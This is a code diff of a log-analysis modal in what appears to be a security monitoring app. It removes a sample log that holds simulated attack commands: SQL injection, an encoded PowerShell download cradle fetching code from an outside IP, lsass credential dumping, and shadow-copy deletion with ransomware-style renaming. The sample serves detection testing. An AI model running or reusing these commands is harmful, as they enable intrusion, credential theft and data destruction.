@@ -12,14 +12,6 @@ interface LogAnalysisModalProps {
   onAnalysisComplete: (result: AnalysisRun) => void;
 }
 
-const SAMPLE_LOG = `<134>Sep 10 09:15:22 dc-prod-01 sshd[1234]: Failed password for root from 45.227.255.9 port 55222 ssh2
-<134>Sep 10 09:15:23 dc-prod-01 sshd[1234]: Failed password for admin from 45.227.255.9 port 55223 ssh2
-<134>Sep 10 09:15:24 dc-prod-01 sshd[1234]: Failed password for sa from 45.227.255.9 port 55224 ssh2
-<134>Sep 10 09:15:31 web-portal-01 nginx[8901]: 194.26.29.114 - - [10/Sep/2026:09:15:31 +0000] "GET /api/staff/search?dept=finance' UNION SELECT 1,username,3 FROM users-- HTTP/1.1" 500 512
-<134>Sep 10 09:16:02 ws-finance-09 powershell[4021]: powershell.exe -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAzADcALgAzADIALgA2ADUALgAxADIALwBhACcAKQAgAC0AdwBpAG4AZABvAHcAcwB0AHkAbABlACAAaABpAGQAZABlAG4A
-<134>Sep 10 09:16:10 ws-finance-09 sysmon[9088]: Process accessed lsass.exe with PROCESS_VM_READ (procdump.exe)
-<134>Sep 10 09:17:00 file-srv-02 wscript[4555]: vssadmin delete shadows /all /quiet && ren *.docs *.lock`;
-
 const SEVERITY_STYLES: Record<string, string> = {
   critical: 'bg-rose-950 text-rose-300 border-rose-800',
   high: 'bg-orange-950 text-orange-300 border-orange-800',
@@ -32,7 +24,7 @@ export const LogAnalysisModal: React.FC<LogAnalysisModalProps> = ({
   onClose,
   onAnalysisComplete,
 }) => {
-  const [content, setContent] = useState(SAMPLE_LOG);
+  const [content, setContent] = useState('');
   const [sourceName, setSourceName] = useState('pasted-log.txt');
   const [createAlerts, setCreateAlerts] = useState(true);
   const [loading, setLoading] = useState(false);
